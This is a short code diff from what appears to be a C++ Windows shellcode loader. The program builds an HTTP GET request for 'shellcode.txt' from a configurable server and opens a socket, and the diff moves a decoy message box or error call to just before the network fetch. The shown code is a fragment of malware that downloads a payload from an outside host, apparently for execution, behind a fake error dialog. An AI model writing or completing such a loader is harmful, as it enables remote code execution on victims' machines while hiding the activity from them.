@@ -21,9 +21,6 @@ int messagebox()
 
 int main()
 {
-	messagebox();
-
-
 	HINSTANCE hInst;
 	WSADATA wsaData;
 	SOCKADDR_IN SockAddr;
@@ -37,6 +34,8 @@ int main()
 	// HTTP GET, enter path to shellcode.txt file here..
 	string get_http = "GET /shellcode.txt HTTP/1.1\r\nHost: " + server + "\r\nConnection: close\r\n\r\n";
 
+	// call message box/error function
+	messagebox();
 
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
 	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
